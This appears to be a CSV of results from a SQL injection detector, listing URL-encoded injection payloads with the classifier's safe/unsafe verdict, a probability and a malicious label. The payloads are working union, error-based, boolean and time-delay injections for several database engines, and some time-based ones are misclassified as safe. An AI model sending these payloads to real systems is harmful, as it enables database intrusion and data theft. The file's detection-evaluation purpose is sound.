request_id,url,payload,classification,probability,label
ac4023c7,,1%25%27%29%29%20union%20all%20select%20null%2Cnull%2Cnull--,unsafe,1.0,1
fa113e4c,,-1602%27%20or%203038%3D3038,unsafe,1.0,1
0fec20fd,,-9841%20where%204612%3D4612%20union%20all%20select%204612--,unsafe,1.0,1
e01980c2,,1%27%7C%7C%28select%20%27rfjl%27%20where%202476%3D2476%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%29%7C%7C%27,unsafe,1.0,1
026a5fbb,,1%25%27%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,unsafe,1.0,1
1f9d6550,,1%27%29%29%20as%20lizu%20where%207691%3D7691%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,unsafe,1.0,1
5ec96c22,,-3546%25%22%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%22%25%22%3D%22,unsafe,1.0,1
f64dfc69,,1%27%20in%20boolean%20mode%29%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29%23,unsafe,1.0,1
4d045996,,-9358%27%20or%209887%3D2569--,unsafe,1.0,1
59ea8826,,1%27%7C%7C%28select%20%27fdkl%27%20where%204572%3D4572%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
377915bd,,1%22%20waitfor%20delay%20%270%3A0%3A5%27%20and%20%22dvfr%22%20like%20%22dvfr,unsafe,1.0,1
170455c4,,-5989%25%22%20union%20all%20select%203581%2C3581%2C3581%2C3581%2C3581--,unsafe,1.0,1
4eb20382,,1%29%20where%209167%3D9167%3Bselect%20%28case%20when%20%286276%3D6276%29%20then%206276%20else%206276%2A%28select%206276%20from%20information_schema.character_sets%29%20end%29%23,unsafe,1.0,1
838391e5,,1%22%29%29%29%3Bselect%20pg_sleep%285%29--,safe,0.1576742159363233,1
04dd885f,,1%25%22%29%29%20union%20all%20select%20null--,unsafe,1.0,1
1dd0e0c2,,1%27%20in%20boolean%20mode%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
d0871af9,,-2456%27%29%29%29%20or%20%288459%3D8459%29%2A4906%20and%20%28%28%28%27bbkp%27%3D%27bbkp,unsafe,1.0,1
1fc542f2,,-4155%27%29%29%29%20union%20all%20select%201775%2C1775%2C1775%2C1775%2C1775%2C1775%2C1775--,unsafe,1.0,1
acc7a1a4,,1%27%20in%20boolean%20mode%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
99f879e0,,1%22%29%20or%205286%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%28%22oxxi%22%3D%22oxxi,unsafe,1.0,1
c9eca8e9,,1%22%20where%205328%3D5328%20and%202388%3Dbenchmark%285000000%2Cmd5%280x6d457153%29%29%23,unsafe,1.0,1
221c50ec,,1%27%29%29%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20and%20%28%28%28%27qhgp%27%3D%27qhgp,unsafe,1.0,1
8682be3c,,1%27%29%29%29%3Bselect%20case%20when%207717%3D7717%20then%201%20else%20null%20end--,safe,0.041066432480290745,1
46af352f,,1%29%20and%20row%286237%2C7469%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%286237%3D6237%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%29a%20group%20by%20x%29%20and%20%285220%3D5220,unsafe,1.0,1
5a206b3d,,1%25%27%29%29%29%20and%20make_set%281543%3D5817%2C5817%29%20and%20%28%28%28%27%25%27%3D%27,unsafe,1.0,1
fd51da1e,,1%27%7C%7C%28select%20%27osux%27%20from%20dual%20where%207066%3D7066%20or%209643%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%29%7C%7C%27,unsafe,1.0,1
bb660f86,,1%29%29%3Bselect%20%2A%20from%20generate_series%284592%2C4592%2Ccase%20when%20%284592%3D4592%29%20then%201%20else%200%20end%29%20limit%201--,unsafe,1.0,1
bfac2b97,,-2951%20or%204189%3D2291,unsafe,1.0,1
bcdcd278,,-2912%27%29%29%20order%20by%201--,unsafe,1.0,1
b2e69c82,,1%22%29%29%20as%20ycvh%20where%204523%3D4523%20and%20sleep%285%29%23,unsafe,1.0,1
39dd2ca1,,-9606%25%22%29%29%29%20union%20all%20select%208572%2C8572%2C8572%2C8572%2C8572%2C8572%2C8572%2C8572%2C8572--,unsafe,1.0,1
74e0dccd,,1%27%20and%20updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29%20and%20%27kird%27%3D%27kird,unsafe,1.0,1
622da0d5,,1%27%7C%7C%28select%20%27bpml%27%20where%207360%3D7360%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29%29%7C%7C%27,unsafe,1.0,1
ce412ba2,,1%20and%20updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29%23%20dyed,unsafe,1.0,1
9aba6501,,-1876%25%27%29%20union%20all%20select%206463--,unsafe,1.0,1
4775df09,,1%25%22%29%20and%20char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29%20and%20%28%22%25%22%3D%22,unsafe,1.0,1
90891703,,1%27%29%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29%20and%20%28%27ayol%27%3D%27ayol,unsafe,1.0,1
52bcce91,,1%25%27%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
d49e3fae,,-6587%27%29%20union%20all%20select%206349%2C6349%2C6349%2C6349%2C6349%2C6349%2C6349%2C6349%2C6349%2C6349--,unsafe,1.0,1
bab33541,,1%27%29%29%20as%20sojl%20where%208710%3D8710%20or%20char%28119%29%7C%7Cchar%28100%29%7C%7Cchar%2899%29%7C%7Cchar%28121%29%3Dregexp_substring%28repeat%28right%28char%281441%29%2C0%29%2C5000000000%29%2Cnull%29--,unsafe,1.0,1
ddf700f0,,-2605%25%27%29%29%29%20union%20all%20select%204738%2C4738%23,unsafe,1.0,1
cec00a6f,,1%29%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29gcrr%29%23,unsafe,1.0,1
e13ae3e4,,1%27%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29,safe,0.0762864362539204,1
a7a4df64,,-9179%22%29%20union%20all%20select%207144%2C7144%2C7144%2C7144%2C7144%2C7144%2C7144%2C7144--,unsafe,1.0,1
25f1e9d4,,1%27%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29,unsafe,1.0,1
60565dc9,,1%22%20or%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288113%3D8113%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20and%20%22uqor%22%20like%20%22uqor,unsafe,1.0,1
7b9e4226,,1%27%29%29%3Biif%285571%3D4947%2C1%2C1/0%29,safe,0.11978336903325115,1
29f5eb27,,1%27%2B%28select%20%27aliz%27%20where%205050%3D5050%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%29%2B%27,unsafe,1.0,1
7f5fa48b,,1%27%29%20as%20gxfu%20where%209676%3D9676%3Bselect%20case%20when%205894%3D4052%20then%201%20else%20null%20end--,unsafe,1.0,1
46927444,,-5245%27%20or%20elt%281032%3D1032%2C3623%29%20and%20%27qfvo%27%3D%27qfvo,unsafe,1.0,1
9bb0dd2e,,1%29%29%20procedure%20analyse%28extractvalue%289627%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x4b774c75%29%29%29%29%29%2C1%29%23,safe,0.08941887099317787,1
f13af241,,1%29%29%20as%20qzmg%20where%204344%3D4344%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29--,unsafe,1.0,1
cf51150a,,1%22%29%29%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%22ewsr%22%20like%20%22ewsr,unsafe,1.0,1
b2e280a7,,-2960%27%20or%202163%3D3143--,unsafe,1.0,1
b3459f70,,1%29%20where%205385%3D5385%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,unsafe,1.0,1
f5d5bec0,,1%27%29%20where%203767%3D3767%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29--,unsafe,1.0,1
05a3ff0e,,1%22%29%29%20as%20hiuf%20where%203277%3D3277%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29--,unsafe,1.0,1
07060761,,-1879%25%27%29%29%20or%203038%3D3038,unsafe,1.0,1
a69415e6,,1%27%20rlike%20sleep%285%29%23,safe,0.09790054597190762,1
108a84cd,,1%20and%20elt%283172%3D7243%2C7243%29,unsafe,1.0,1
94d19883,,1%25%27%20or%201022%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,1.0,1
665b08fc,,-1150%27%29%20as%20hdby%20where%204032%3D4032%20union%20all%20select%204032%2C4032%2C4032%2C4032%2C4032%2C4032%2C4032%2C4032%2C4032%2C4032--,unsafe,1.0,1
eadc6d67,,1%27%29%3Bwaitfor%20delay%20%270%3A0%3A5%27%20and%20%28%27yauq%27%3D%27yauq,unsafe,1.0,1
fdffcfb6,,1%25%22%29%29%3Bselect%20pg_sleep%285%29%20and%20%28%28%22%25%22%3D%22,unsafe,1.0,1
e11c166b,,1%22%20rlike%20%28select%20%28case%20when%20%282724%3D4757%29%20then%201%20else%200x28%20end%29%29%20and%20%22cmsa%22%3D%22cmsa,unsafe,1.0,1
c2f1f876,,1%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29,unsafe,1.0,1
e938fe41,,1%22%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%22vukd%22%3D%22vukd,unsafe,1.0,1
7e4d7625,,%28select%20%28case%20when%20%281421%3D1421%29%20then%201%20else%201421%2A%28select%201421%20from%20master..sysdatabases%29%20end%29%29,unsafe,1.0,1
e33bc2da,,-5205%27%29%29%20union%20all%20select%208592%2C8592%2C8592%2C8592%2C8592%2C8592--,unsafe,1.0,1
4343cb4d,,1%20and%20elt%288853%3D1675%2C1675%29--%20jegm,unsafe,1.0,1
979df2c4,,1%29%29%20as%20nnpe%20where%209720%3D9720%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
33504515,,-8553%27%2B%28select%20adko%20where%201750%3D1750%20union%20all%20select%201750%23,unsafe,1.0,1
76e453de,,1%22%29%29%20and%208594%3D%28select%208594%20from%20pg_sleep%285%29%29--,unsafe,1.0,1
b5a98c3e,,1%27%7C%7C%28select%20%27ymwf%27%20where%201229%3D1229%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29%29%7C%7C%27,unsafe,1.0,1
f20d4784,,1%25%22%29%29%29%3Bselect%20%28case%20when%20%282140%3D5325%29%20then%202140%20else%202140%2A%28select%202140%20from%20information_schema.character_sets%29%20end%29%23,unsafe,1.0,1
e490c08a,,1%29%20as%20zdym%20where%201578%3D1578%20union%20all%20select%20null%2Cnull%2Cnull%23,unsafe,1.0,1
642769c2,,1%27%29%20as%20ibqr%20where%205372%3D5372%20and%208312%3Ddbms_pipe.receive_message%28chr%2869%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%7C%7Cchr%2868%29%2C5%29--,unsafe,1.0,1
e6ea66ec,,1%22%29%29%29%20or%208156%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,unsafe,1.0,1
01963369,,1%29%29%29%20and%20make_set%288882%3D1593%2C1593%29%20and%20%28%28%287989%3D7989,unsafe,1.0,1
e73f1f91,,-6846%25%22%29%29%20or%20%288459%3D8459%29%2A4906%20and%20%28%28%22%25%22%3D%22,unsafe,1.0,1
98b9b226,,1%27%7C%7C%28select%20%27ypil%27%20from%20dual%20where%204568%3D4568%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%29%7C%7C%27,unsafe,1.0,1
ef3fc553,,-9541%29%20as%20bnky%20where%203934%3D3934%20union%20all%20select%203934%2C3934%2C3934%23,unsafe,1.0,1
176a8a43,,-3361%20where%201335%3D1335%20or%20elt%285891%3D5092%2C5092%29--,unsafe,1.0,1
7507db0e,,1%27%20in%20boolean%20mode%29%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%23,unsafe,1.0,1
cdd81dd4,,1%29%20where%209213%3D9213%20and%208189%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,unsafe,1.0,1
03800f22,,1%29%29%20as%20hxtp%20where%205478%3D5478%20and%208594%3D%28select%208594%20from%20pg_sleep%285%29%29--,unsafe,1.0,1
aaee0fac,,1%29%29%20rlike%20sleep%285%29%23,safe,0.14339633666361903,1
1799227d,,1%25%27%29%29%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29gcrr%29%23,unsafe,1.0,1
73df07f7,,-2929%22%29%29%29%20union%20all%20select%208999%2C8999%23,unsafe,1.0,1
2f79a5ce,,1%27%29%29%20as%20grne%20where%209003%3D9003%20order%20by%201--,unsafe,1.0,1
ec14a8bd,,-8893%25%27%29%29%20or%20elt%281032%3D1032%2C3623%29%20and%20%28%28%27%25%27%3D%27,unsafe,1.0,1
f2588fe8,,1%27%2B%28select%20jrmz%20where%204762%3D4762%20and%20elt%289588%3D9794%2C9794%29%29%2B%27,unsafe,1.0,1
c2655680,,1%27%29%3Bselect%20sleep%285%29,safe,0.14339633666361903,1
dff670db,,1%27%2C%28select%20%28case%20when%20%287734%3D7734%29%20then%20%28select%20benchmark%285000000%2Cmd5%280x72747341%29%29%29%20else%207734%2A%28select%207734%20from%20mysql.db%29%20end%29%29,unsafe,1.0,1
c70454cb,,1%29%29%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29%20and%20%28%284348%3D4348,unsafe,1.0,1
2962d71c,,-4711%27%20in%20boolean%20mode%29%20union%20all%20select%208007%2C8007%2C8007%2C8007%2C8007%2C8007--,unsafe,1.0,1
66daeb9f,,1%22%29%20order%20by%201--,unsafe,1.0,1
28d36567,,1%27%29%20as%20nftr%20where%208825%3D8825%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sddo%29%23,unsafe,1.0,1
9d3c979f,,1%27%29%29%29%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%28%27isyg%27%3D%27isyg,unsafe,1.0,1
5804278f,,1%27%2B%28select%20%27wpnm%27%20where%208223%3D8223%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%29%2B%27,unsafe,1.0,1
29017858,,1%27%29%29%20rlike%20sleep%285%29%20and%20%28%28%27qitl%27%20like%20%27qitl,unsafe,1.0,1
723cd10c,,1%22%29%29%20or%206793%3D%28select%206793%20from%20pg_sleep%285%29%29%20and%20%28%28%22ejpw%22%3D%22ejpw,unsafe,1.0,1
2e52e921,,1%27%20or%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288113%3D8113%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20and%20%27qvyq%27%20like%20%27qvyq,unsafe,1.0,1
02a1f510,,1%27%2B%28select%20eztr%20where%204260%3D4260%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29%29%2B%27,unsafe,1.0,1
4a4d86af,,1%27%3Bselect%20%28case%20when%20%284666%3D4666%29%20then%201%20else%204666%2A%28select%204666%20from%20master..sysdatabases%29%20end%29--,unsafe,1.0,1
39903b97,,1%25%22%29%29%3Bselect%20%2A%20from%20generate_series%284592%2C4592%2Ccase%20when%20%284592%3D4592%29%20then%201%20else%200%20end%29%20limit%201--,unsafe,1.0,1
a700d631,,1%25%27%29%29%29%3Bselect%20case%20when%207717%3D7717%20then%201%20else%20null%20end--,safe,0.046827611869130883,1
385c5aa8,,1%27%3Bselect%20case%20when%206555%3D7349%20then%201%20else%20null%20end--,safe,0.02734684914031426,1
d37531b6,,-3420%20where%209681%3D9681%20or%20make_set%282438%3D1977%2C1977%29--,unsafe,1.0,1
cef01044,,-2505%27%20or%209323%3D9323%23,unsafe,1.0,1
a6581d5b,,1%22%29%29%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20and%20%28%28%22llgb%22%20like%20%22llgb,unsafe,1.0,1
e9c3edf8,,1%29%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,safe,0.06943922317386687,1
3d5ae598,,1%27%29%29%20and%205556%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%28%28%27nvsy%27%20like%20%27nvsy,unsafe,1.0,1
9cf62952,,-9997%27%20union%20all%20select%209347%2C9347%2C9347%2C9347%2C9347%2C9347%2C9347%2C9347%23,unsafe,1.0,1
77196008,,1%22%29%29%29%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29%20and%20%28%28%28%22vfoh%22%3D%22vfoh,unsafe,1.0,1
61e9852f,,1%29%29%20as%20rual%20where%204649%3D4649%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--,unsafe,1.0,1
124e9311,,-7725%25%27%29%29%20union%20all%20select%204559%2C4559%2C4559%2C4559%2C4559%2C4559%2C4559%2C4559%2C4559--,unsafe,1.0,1
bb63f1c7,,1%27%29%29%29%20or%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288113%3D8113%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20and%20%28%28%28%27qpuy%27%3D%27qpuy,unsafe,1.0,1
e446d601,,1%25%27%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%27%25%27%3D%27,unsafe,1.0,1
85e16166,,1%20or%20row%281045%2C7562%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%29a%20group%20by%20x%29,unsafe,1.0,1
5cbbc772,,1%27%2B%28select%20%27jmdl%27%20where%207827%3D7827%3Bselect%20pg_sleep%285%29%29%2B%27,unsafe,1.0,1
560b2717,,-3860%27%20union%20all%20select%203510%2C3510%2C3510%23,unsafe,1.0,1
b1b57947,,1%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--%20rucf,safe,0.11166633633796498,1
cb3ad017,,-6292%29%20union%20all%20select%207499%2C7499%2C7499%2C7499%2C7499%2C7499%2C7499--,unsafe,1.0,1
e8753c42,,-9859%22%29%29%29%20union%20all%20select%206595%2C6595%2C6595%2C6595%2C6595%2C6595%2C6595%23,unsafe,1.0,1
1b0cbc78,,1%20or%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%286270%3D6270%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29,unsafe,1.0,1
188eec67,,1%27%29%29%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sddo%29%23,unsafe,1.0,1
7c33f289,,1%25%22%29%29%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20and%20%28%28%22%25%22%3D%22,unsafe,1.0,1
175d08e5,,1%27%20and%206055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%286055%3D6055%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%27moyb%27%3D%27moyb,unsafe,1.0,1
01338e0a,,1%22%29%20where%207578%3D7578%20and%206414%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,unsafe,1.0,1
f88c1c66,,1%27%29%29%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29%20and%20%28%28%27ckmm%27%20like%20%27ckmm,unsafe,1.0,1
1dbda117,,1%27%7C%7C%28select%20%27tcfy%27%20where%204546%3D4546%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29%29%7C%7C%27,unsafe,1.0,1
fbb1ef03,,1%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4,unsafe,1.0,1
e64938a2,,-7395%25%22%20order%20by%201--,unsafe,1.0,1
5e6550f6,,1%22%29%29%20as%20iqgd%20where%207611%3D7611%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
6731d274,,1%27%29%20as%20pxcd%20where%209754%3D9754%20or%20sleep%285%29--,unsafe,1.0,1
f744128e,,1%29%20or%20updatexml%281808%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%281808%3D1808%2C1%29%29%29%2C0x717a767a71%29%2C8666%29%20and%20%283294%3D3294,unsafe,1.0,1
3c16226c,,1%22%29%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29%20and%20%28%22zyeo%22%20like%20%22zyeo,unsafe,1.0,1
c4725bd8,,1%27%2B%28select%20ounb%20where%204653%3D4653%20or%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%286270%3D6270%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%29%2B%27,unsafe,1.0,1
dcc2a682,,-6254%22%20where%208941%3D8941%20or%20elt%281032%3D1032%2C3623%29--,unsafe,1.0,1
